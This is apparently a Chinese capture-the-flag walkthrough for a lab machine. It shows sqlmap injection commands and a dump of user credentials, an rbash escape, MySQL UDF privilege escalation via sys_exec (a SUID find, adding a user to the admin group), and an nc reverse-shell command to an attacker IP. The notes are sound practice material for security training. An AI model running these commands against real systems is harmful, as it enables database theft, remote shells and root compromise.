# **level four** SQL注入+脏牛提权/MYSQL_UDF提权

## sqlmap

```bash
sqlmap -r level4 --level 4 --risk 3  
sqlmap -r level4 --level 4 --risk 3 -p mypassword --dbs
sqlmap -r level4 --level 4 --risk 3 -p mypassword -D members --tables
sqlmap -r level4 --level 4 --risk 3 -p mypassword -D members -T members --columns
sqlmap -r level4 --level 4 --risk 3 -p mypassword -D members -T members -C "username,password" --dump
```

得到

```bash
+----------+-----------------------+
| username | password              |
+----------+-----------------------+
| robert   | ADGAdsafdfwt4gadfga== |
| john     | MyNameIsJohn          |
+----------+-----------------------+
```

>发现是两用户的账户和密码  
ssh连接，得到rbash,输入`?`,可使用`echo os.system("/bin/bash")`逃逸  
>上传脚本查看服务器信息
>
> + 发现可以使用32位脏牛提权（还未实验）  
> + 可以无密码登录mysql的root用户（查看SOFTWARE）  
> + mysql以root身份运行(查看SERVICES)  

## MYSQL UDF提权

>两个条件  

1. Mysql -v >=5
2. 存在lib_mysqludf_sys  

```SQL
use mysql
select * from func;
```

三种方法  

+ 利用root权限构建SUID程序  

```mysql
SELECT sys_exec('chmod u+s /usr/bin/find') #使find指令可以用root权限执行
```

```bash
touch 111 #创建文件
find 111 -exec "/bin/sh" #打开终端
```

+ 使用root权限执行命令，建立反弹shell  
`select sys_exec("/bin/nc.traditional -e /bin/sh 192.168.205.138 8888");`

+ 使用root权限将当前用户加入管理员用户组  
`select sys_exec('usermod -a -G admin john')`  
`sudo su root` 更改用户
